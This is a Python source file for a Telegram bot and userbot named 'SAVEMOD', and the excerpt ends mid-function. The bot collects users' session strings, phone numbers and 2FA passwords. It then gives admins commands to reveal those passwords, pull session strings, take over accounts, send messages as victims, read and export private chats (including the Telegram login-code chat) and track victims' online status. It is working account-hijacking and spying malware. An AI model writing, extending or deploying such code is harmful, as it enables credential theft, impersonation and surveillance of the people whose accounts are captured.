import asyncio
import sqlite3
import os
import sys
import json
import re
import time
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread
from typing import Optional, Dict, List, Any, Tuple, Set

from flask import Flask, request, jsonify
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.types import (
    UserStatusOnline, UserStatusOffline, UserStatusRecently,
    UserStatusLastWeek, UserStatusLastMonth, UserStatusEmpty,
    Message, PeerUser, PeerChat, PeerChannel
)
from telethon.tl.functions.messages import SendMessageRequest
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import nest_asyncio

# ============================================================================
# НАСТРОЙКА ЛОГИРОВАНИЯ
# ============================================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)
nest_asyncio.apply()

# ============================================================================
# КОНФИГУРАЦИЯ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ
# ============================================================================

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("❌ Ошибка: Не заданы обязательные переменные окружения!")
    logger.error("Нужно указать: API_ID, API_HASH, BOT_TOKEN, ADMIN_IDS")
    sys.exit(1)

logger.info(f"👥 Администраторы: {ADMIN_IDS}")

# ============================================================================
# НАСТРОЙКА ХРАНИЛИЩА (VOLUME)
# ============================================================================

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
logger.info(f"📁 Путь к БД: {DB_PATH}")

# ============================================================================
# ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ
# ============================================================================

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT,
        last_seen TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        reason TEXT,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT,
        is_edited INTEGER DEFAULT 0
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS spy_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        sender_id INTEGER,
        sender_name TEXT,
        message TEXT,
        chat_id INTEGER,
        chat_name TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_status_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        user_id INTEGER,
        user_name TEXT,
        status TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS custom_commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        command TEXT,
        response TEXT,
        created_by INTEGER,
        created_at TEXT
    )
''')

conn.commit()
logger.info("✅ База данных инициализирована")

# ============================================================================
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# ============================================================================

active_clients: Dict[int, TelegramClient] = {}
saved_messages: Dict[int, Dict[int, Dict[str, Any]]] = {}
temp_auth: Dict[int, Dict[str, Any]] = {}
active_chats: Dict[int, List[Dict[str, Any]]] = {}
user_status_tracker: Dict[int, Dict[int, str]] = {}
custom_commands_cache: Dict[str, str] = {}
current_active_user: Optional[int] = None
monitored_users: Dict[str, Dict[str, Any]] = {}
pending_2fa: Dict[int, Dict[str, Any]] = {}

# ============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================================

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_target_admin(target_id: int) -> bool:
    return target_id in ADMIN_IDS

def escape_html(text: str) -> str:
    return html.escape(str(text))

def get_status_emoji(status) -> str:
    if isinstance(status, UserStatusOnline):
        return "🟢"
    elif isinstance(status, UserStatusOffline):
        return "⚫"
    elif isinstance(status, UserStatusRecently):
        return "🟡"
    elif isinstance(status, UserStatusLastWeek):
        return "🟠"
    elif isinstance(status, UserStatusLastMonth):
        return "🔴"
    else:
        return "⚪"

def get_status_text(status) -> str:
    if isinstance(status, UserStatusOnline):
        return "🟢 В сети прямо сейчас"
    elif isinstance(status, UserStatusOffline):
        if status.was_online:
            diff = datetime.now().astimezone() - status.was_online
            minutes = int(diff.total_seconds() // 60)
            if minutes < 60:
                return f"⚫ Был {minutes} мин назад"
            else:
                hours = minutes // 60
                return f"⚫ Был {hours} ч назад"
        return "⚫ Не в сети"
    elif isinstance(status, UserStatusRecently):
        return "🟡 Был недавно"
    elif isinstance(status, UserStatusLastWeek):
        return "🟠 Был на неделе"
    elif isinstance(status, UserStatusLastMonth):
        return "🔴 Был в месяце"
    else:
        return "⚪ Статус скрыт"

def get_active_client() -> Tuple[Optional[TelegramClient], Optional[int]]:
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client: TelegramClient, target: str) -> Optional[Any]:
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        if target.startswith('+') and target[1:].isdigit():
            cursor.execute('SELECT user_id FROM user_sessions WHERE phone=?', (target,))
            row = cursor.fetchone()
            if row:
                return await client.get_entity(row[0])
            return await client.get_entity(target)
        if target.startswith('@'):
            return await client.get_entity(target)
        if target.lower() == 'me':
            return await client.get_me()
        return await client.get_entity(target)
    except Exception as e:
        logger.error(f"Ошибка поиска сущности {target}: {e}")
        return None

async def send_to_admins(text: str, parse_mode: str = 'HTML'):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode=parse_mode)
        except Exception as e:
            logger.error(f"Ошибка отправки админу {admin_id}: {e}")

def get_code_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_digit_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_digit_0"),
        InlineKeyboardButton("⌫", callback_data="code_backspace"),
        InlineKeyboardButton("✅", callback_data="code_submit")
    )
    return kb

async def export_chat_to_html(client: TelegramClient, chat_id: int, chat_name: str, me) -> Optional[str]:
    messages = []
    async for msg in client.iter_messages(chat_id, limit=5000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Я)"
                    sender_class = "outgoing"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                    sender_class = "incoming"
                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
                text = escape_html(msg.text).replace('\n', '<br>')
                messages.append(f'<div class="message {sender_class}"><div class="message-header"><span class="sender">{escape_html(sender_name)}</span><span class="date">{timestamp}</span></div><div class="message-text">{text}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    html_content = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
.container {{ max-width: 800px; margin: 0 auto; background: #17212b; border-radius: 16px; overflow: hidden; }}
.chat-header {{ background: #1e2a3a; padding: 20px; border-bottom: 1px solid #2b3945; }}
.chat-header h2 {{ margin: 0; font-size: 20px; }}
.messages {{ padding: 20px; }}
.message {{ margin-bottom: 16px; padding: 10px 14px; border-radius: 14px; max-width: 85%; word-wrap: break-word; }}
.incoming {{ background: #2b3945; margin-right: auto; border-bottom-left-radius: 4px; }}
.outgoing {{ background: #5288c1; margin-left: auto; text-align: right; border-bottom-right-radius: 4px; }}
.message-header {{ font-size: 12px; margin-bottom: 6px; display: flex; justify-content: space-between; }}
.sender {{ font-weight: bold; }}
.date {{ font-size: 10px; color: #6c7883; }}
.message-text {{ font-size: 14px; white-space: pre-wrap; }}
.stats {{ background: #0e1621; padding: 12px; text-align: center; font-size: 12px; color: #6c7883; }}
</style>
</head>
<body>
<div class="container">
<div class="chat-header"><h2>💬 Чат с {escape_html(chat_name)}</h2><div class="stats">Всего сообщений: {len(messages)}</div></div>
<div class="messages">{''.join(messages)}</div>
<div class="stats">📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
</div>
</body>
</html>'''
    return html_content

# ============================================================================
# АДМИНСКИЕ КОМАНДЫ
# ============================================================================

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)

@dp.message_handler(commands=['spyhelp'])
async def cmd_spyhelp(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("""
🕵️ <b>SAVEMOD - ПОЛНЫЙ СПИСОК КОМАНД</b>
═══════════════════════════════════

<b>👥 УПРАВЛЕНИЕ АККАУНТАМИ</b>
/users - список всех аккаунтов
/sessions - список всех сессий
/swap [НОМЕР] - переключиться на аккаунт
/active - показать активный аккаунт
/del_session [НОМЕР] - удалить сессию
/show2fa [НОМЕР] - показать 2FA пароль
/reset_me - сбросить свою сессию

<b>💬 ДЕЙСТВИЯ ОТ ИМЕНИ АКТИВНОГО</b>
/send [ID/@username] [текст] - отправить сообщение
/chat [ID/@username/tg] - посмотреть чат (с кнопками)
/chats - список всех ЛС диалогов
/status [@username] - статус пользователя
/online - кто в сети
/export [ID/@username] - экспорт переписки в HTML

<b>🔐 УПРАВЛЕНИЕ БЕЗОПАСНОСТЬЮ</b>
/session [НОМЕР] - получить StringSession
/set2fa [ПАРОЛЬ] - установить 2FA
/info - информация об аккаунте

<b>📊 МОНИТОРИНГ И ЛОГИ</b>
/mon [@username] - начать мониторинг пользователя
/unmon [@username] - остановить мониторинг
/logs [N] - последние N логов
/statuslogs [N] - логи входов/выходов
/stats - статистика
/backup - бэкап базы данных

<b>🤖 КОМАНДЫ ЮЗЕРБОТА (через точку)</b>
.help - справка
.mute - заглушить (ответ на сообщение)
.unmute - разглушить (ответ на сообщение)
.list - список заглушенных
.spam [кол-во] [текст] - спам (без лимита)
.type [текст] - эффект печати
.info - информация о пользователе
""", parse_mode='HTML')

@dp.message_handler(commands=['users'])
async def cmd_users(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa, is_active, registered_at FROM user_sessions ORDER BY registered_at DESC')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет зарегистрированных аккаунтов")
        return
    response = "👥 <b>ВСЕ АККАУНТЫ</b>\n════════════════\n\n"
    idx = 0
    for row in rows:
        uid, fname, lname, uname, phone, two_fa, is_active, reg_at = row
        if is_target_admin(uid):
            continue
        idx += 1
        name = fname or ""
        if lname:
            name += f" {lname}"
        if not name:
            name = uname or str(uid)
        active_mark = " ✅" if (is_active == 1 or uid == current_active_user) else ""
        two_fa_mark = "✅" if two_fa else "❌"
        reg_date = reg_at[:10] if reg_at else "—"
        response += f"<b>{idx}. {name}</b>{active_mark}\n   🆔 <code>{uid}</code>\n   📱 {phone or '—'}\n   🔐 2FA: {two_fa_mark}\n   📅 Регистрация: {reg_date}\n\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')
    await message.answer("💡 /swap НОМЕР - переключиться\n💡 /show2fa НОМЕР - показать 2FA")

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сохраненных сессий")
        return
    sessions_list = []
    for row in rows:
        uid, fname, uname, phone, is_active = row
        if is_target_admin(uid):
            continue
        name = fname or uname or str(uid)
        status = "✅" if (uid in active_clients or is_active == 1) else "❌"
        sessions_list.append(f"{status} <code>{uid}</code> - {name}")
    response = f"📋 <b>СОХРАНЕННЫЕ СЕССИИ ({len(sessions_list)})</b>\n══════════════════════\n\n" + "\n".join(sessions_list)
    await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname) for (uid, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        target_id, fname, uname = non_admin_rows[num]
        name = fname or uname or str(target_id)
        if target_id in active_clients:
            try:
                await active_clients[target_id].disconnect()
            except:
                pass
            del active_clients[target_id]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (target_id,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (target_id,))
        conn.commit()
        await message.answer(f"✅ Сессия пользователя <b>{name}</b> ({target_id}) удалена")
        try:
            await bot.send_message(target_id, "❌ Ваша сессия была удалена. Отправьте /start для повторной авторизации")
        except:
            pass
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message: aiogram_types.Message):
    user_id = message.from_user.id
    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except:
            pass
        del active_clients[user_id]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (user_id,))
    conn.commit()
    await message.answer("✅ Ваша сессия удалена. Отправьте /start для повторной авторизации")

@dp.message_handler(commands=['show2fa'])
async def cmd_show2fa(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        client, uid = get_active_client()
        if not client:
            await message.answer("❌ Нет активного аккаунта")
            return
        if is_target_admin(uid):
            await message.answer("❌ Невозможно показать 2FA для администратора")
            return
        cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[1]:
            await message.answer(f"🔐 <b>2FA для {row[0]}</b>\n\n<code>{row[1]}</code>\n\n⚠️ Храните в секрете!", parse_mode='HTML')
        else:
            await message.answer(f"❌ 2FA не установлен для {row[0] if row else uid}")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname, two_fa) for (uid, fname, uname, two_fa) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        uid, fname, uname, two_fa = non_admin_rows[num]
        name = fname or uname or str(uid)
        if two_fa:
            await message.answer(f"🔐 <b>2FA для {name}</b>\n\n<code>{two_fa}</code>\n\n⚠️ Храните в секрете!", parse_mode='HTML')
        else:
            await message.answer(f"❌ 2FA не установлен для {name}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message: aiogram_types.Message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /swap НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, fname, uname) for (uid, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        user_id = non_admin_rows[num][0]
        name = non_admin_rows[num][1] or non_admin_rows[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт <b>{name}</b> не запущен", parse_mode='HTML')
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на <b>{me.first_name}</b> (@{me.username or 'нет'})", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['active'])
async def cmd_active(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    if is_target_admin(uid):
        await message.answer("❌ Активный аккаунт - администратор (скрыт)")
        return
    try:
        me = await client.get_me()
        await message.answer(f"✅ <b>Активный аккаунт</b>\n\n👤 {me.first_name} {me.last_name or ''}\n🆔 <code>{me.id}</code>\n@ {me.username or 'нет'}", parse_mode='HTML')
    except:
        await message.answer(f"✅ Активный ID: <code>{uid}</code>", parse_mode='HTML')

@dp.message_handler(commands=['send'])
async def cmd_send(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /send @username ТЕКСТ")
        return
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Укажите получателя и текст")
        return
    target = parts[0]
    text = parts[1]
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта. Используйте /swap")
        return
    entity = await resolve_entity(client, target)
    if not entity:
        await message.answer("❌ Пользователь не найден")
        return
    if is_target_admin(entity.id):
        await message.answer("❌ Нельзя отправлять сообщения администратору")
        return
    try:
        await client.send_message(entity.id, text)
        target_name = getattr(entity, 'first_name', getattr(entity, 'username', target))
        await message.answer(f"✅ Сообщение отправлено <b>{target_name}</b>\n📝 {text[:200]}", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ===== /chat - РАБОТАЕТ СРАЗУ БЕЗ ПРЕДВАРИТЕЛЬНОГО /chats =====
@dp.message_handler(commands=['chat'])
async def cmd_chat(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /chat ID\n/chat @username\n/chat tg - чат с Telegram")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        chat_id = None
        chat_name = None
        if args.lower() in ['tg', '777000', '+42777', 'telegram']:
            chat_id = 777000
            chat_name = "Telegram (коды подтверждения)"
        else:
            entity = await resolve_entity(client, args)
            if not entity:
                await message.answer("❌ Пользователь не найден")
                return
            if is_target_admin(entity.id):
                await message.answer("❌ Нельзя смотреть чат администратора")
                return
            chat_id = entity.id
            chat_name = entity.first_name or entity.username or args
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("📝 Последние 30", callback_data=f"chat_last_{chat_id}_{chat_name}"),
            InlineKeyboardButton("📄 Полная переписка (HTML)", callback_data=f"chat_full_{chat_id}_{chat_name}")
        )
        await message.answer(f"📱 <b>Чат с {chat_name}</b>\n\nВыберите действие:", parse_mode='HTML', reply_markup=kb)
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта. Используйте /swap")
        return
    status_msg = await message.answer("🔄 Собираю список диалогов...")
    chats = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if getattr(entity, 'bot', False) or entity.id == uid or is_target_admin(entity.id):
                    continue
                name = entity.first_name or entity.username or str(entity.id)
                if entity.username:
                    name += f" (@{entity.username})"
                chats.append({'id': entity.id, 'name': name})
            except:
                chats.append({'id': dialog.id, 'name': dialog.name or str(dialog.id)})
    active_chats[uid] = chats
    me = await client.get_me()
    await status_msg.delete()
    if not chats:
        await message.answer(f"📭 Нет ЛС диалогов у {me.first_name}")
        return
    response = f"📋 <b>СПИСОК ЛС ДИАЛОГОВ ОТ {me.first_name}</b>\n═══════════════════════════\n\n"
    for i, chat in enumerate(chats):
        response += f"{i+1}. {chat['name']}\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')
    await message.answer(f"💡 Всего диалогов: <b>{len(chats)}</b>\n/chat НОМЕР - посмотреть переписку", parse_mode='HTML')

@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
async def chat_last_callback(callback: aiogram_types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    await callback.answer("⏳ Загружаю последние сообщения...")
    data = callback.data.replace('chat_last_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    msgs = []
    async for msg in client.iter_messages(chat_id, limit=30):
        if msg.text:
            try:
                if msg.out:
                    sender_name = "👉 Я"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    if not sender or is_target_admin(sender.id):
                        continue
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sender_name}: {msg.text[:150]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
    if msgs:
        response = f"💬 <b>ЧАТ С {chat_name}</b>\n\n" + "\n".join(reversed(msgs[-25:]))
        await callback.message.answer(response[:4000], parse_mode='HTML')
    else:
        await callback.message.answer("📭 Нет сообщений")

@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
async def chat_full_callback(callback: aiogram_types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    await callback.answer("⏳ Экспортирую переписку...")
    data = callback.data.replace('chat_full_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await client.get_me()
        status_msg = await callback.message.answer(f"🔄 Экспортирую чат с <b>{chat_name}</b>...\n\n⏳ Это может занять время...", parse_mode='HTML')
        html_content = await export_chat_to_html(client, chat_id, chat_name, me)
        if not html_content:
            await status_msg.edit_text("❌ Нет сообщений для экспорта")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        await status_msg.edit_text("✅ Экспорт завершен! Отправляю файл...")
        with open(temp_path, 'rb') as f:
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 <b>Полная переписка с {chat_name}</b>", parse_mode='HTML')
                    await f.seek(0)
                except:
                    pass
        os.unlink(temp_path)
        await status_msg.delete()
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка экспорта: {e}")

@dp.message_handler(commands=['export'])
async def cmd_export(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /export @username\n/export ID")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity:
        await message.answer("❌ Пользователь не найден")
        return
    if is_target_admin(entity.id):
        await message.answer("❌ Нельзя экспортировать чат администратора")
        return
    chat_name = entity.first_name or entity.username or str(entity.id)
    status_msg = await message.answer(f"🔄 Экспортирую чат с <b>{chat_name}</b>...\n\n⏳ Собираю сообщения...", parse_mode='HTML')
    try:
        me = await client.get_me()
        html_content = await export_chat_to_html(client, entity.id, chat_name, me)
        if not html_content:
            await status_msg.edit_text("❌ Нет сообщений для экспорта")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        await status_msg.edit_text("✅ Экспорт завершен! Отправляю файл...")
        with open(temp_path, 'rb') as f:
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 <b>Полная переписка с {chat_name}</b>", parse_mode='HTML')
                    await f.seek(0)
                except:
                    pass        os.unlink(temp_path)
        await status_msg.delete()
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['status'])
async def cmd_status(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /status @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity:
        await message.answer("❌ Пользователь не найден")
        return
    if getattr(entity, 'bot', False):
        await message.answer("❌ Это бот")
        return
    if is_target_admin(entity.id):
        await message.answer("❌ Нельзя смотреть статус администратора")
        return
    status_emoji = get_status_emoji(entity.status) if hasattr(entity, 'status') else "⚪"
    status_text = get_status_text(entity.status) if hasattr(entity, 'status') else "Статус скрыт"
    await message.answer(f"{status_emoji} <b>СТАТУС ПОЛЬЗОВАТЕЛЯ</b>\n═══════════════════\n\n👤 Имя: {entity.first_name}\n🆔 ID: <code>{entity.id}</code>\n📊 {status_text}", parse_mode='HTML')

@dp.message_handler(commands=['online'])
async def cmd_online(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    status_msg = await message.answer("🔄 Проверяю кто в сети...")
    online_users = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if not getattr(entity, 'bot', False) and not is_target_admin(entity.id):
                    if isinstance(entity.status, UserStatusOnline):
                        online_users.append(dialog.name)
            except:
                pass
    me = await client.get_me()
    await status_msg.delete()
    if online_users:
        await message.answer(f"🟢 <b>В СЕТИ ОТ {me.first_name}</b>\n═══════════════════\n\n👥 Онлайн: {len(online_users)}\n\n" + "\n".join(online_users[:50]), parse_mode='HTML')
    else:
        await message.answer(f"🟢 В сети от {me.first_name} никого нет")

@dp.message_handler(commands=['mon'])
async def cmd_mon(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /mon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity:
        await message.answer("❌ Пользователь не найден")
        return
    if getattr(entity, 'bot', False):
        await message.answer("❌ Это бот")
        return
    if is_target_admin(entity.id):
        await message.answer("❌ Нельзя мониторить администратора")
        return
    user_key = str(entity.id)
    monitored_users[user_key] = {'name': entity.first_name or entity.username or str(entity.id), 'admin_id': message.from_user.id, 'user_id': entity.id}
    await message.answer(f"✅ <b>Начат мониторинг</b>\n\n👤 Пользователь: {monitored_users[user_key]['name']}\n🆔 ID: <code>{entity.id}</code>\n\n📊 Уведомления о входе/выходе будут приходить сюда", parse_mode='HTML')

@dp.message_handler(commands=['unmon'])
async def cmd_unmon(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /unmon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity:
        await message.answer("❌ Пользователь не найден")
        return
    user_key = str(entity.id)
    if user_key in monitored_users:
        del monitored_users[user_key]
        await message.answer(f"✅ Мониторинг <b>{entity.first_name or entity.username}</b> остановлен", parse_mode='HTML')
    else:
        await message.answer("❌ Этот пользователь не отслеживается")

@dp.message_handler(commands=['session'])
async def cmd_session(message: aiogram_types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ Использование: /session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin_rows = [(uid, ss, phone, two_fa, fname, uname) for (uid, ss, phone, two_fa, fname, uname) in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin_rows):
            await message.answer("❌ Неверный номер")
            return
        uid, ss, phone, two_fa, fname, uname = non_admin_rows[num]
        name = fname or uname or str(uid)
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"🎭 <b>StringSession для {name}</b>\n\n🆔 ID: <code>{uid}</code>\n📱 Телефон: {phone or '—'}\n🔐 2FA: {two_fa or '—'}\n\n<code>{ss}</code>\n\n⚠️ Храните в секрете!", parse_mode='HTML')
            except:
                pass
        await message.answer("✅ StringSession отправлена всем администраторам")
    except Exception as e:
